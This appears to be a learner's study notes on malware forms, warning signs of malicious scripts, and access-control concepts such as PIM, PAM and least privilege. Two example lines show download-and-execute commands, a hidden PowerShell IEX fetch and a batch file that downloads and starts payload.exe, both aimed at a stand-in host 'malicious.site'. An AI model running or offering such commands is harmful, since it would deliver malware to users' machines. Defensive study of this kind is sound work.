Malware can arrive in different forms. Two common types are: 
    - Binary Malware
Compiled executable. Typically a .exe / .dll (dynamic link library) / otherwise.
Example: 
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')"


    - Script Based Malware
Written in scripting languages (Powershell, Bash, Python, JS, etc.).
Example:
@echo off
powershell -Command "Invoke-WebRequest http://malicious.site/payload.exe -OutFile C:\Users\Public\payload.exe" start C:\Users\Public\payload.exe



    How to identify malware? 
Checksum; a string of nums/ letters generated from a file by hashing it. (e.g using md5)

There are some clear warning signs that a script may be acting maliciously:

    * The script downloads or runs other files from the internet. 
    * It makes changes to system settings or disables security tools.
    * It runs commands that are not usually part of standard operation, especially with encoded or obfuscated content.
    * The script unexpectedly launches other applications, such as PowerShell or CMD

Defining levels of access:
    Depends on two things: individuals role, sensitivity of info.

    Privileged Identity Management (PIM)
        Translates user's role into access role in system.


    Privileged Access Management (or PAM for short).
        Given a certain PIM, it's privileges are defined by PAM.

Principle of least privilege! Only necessary privileges granted.
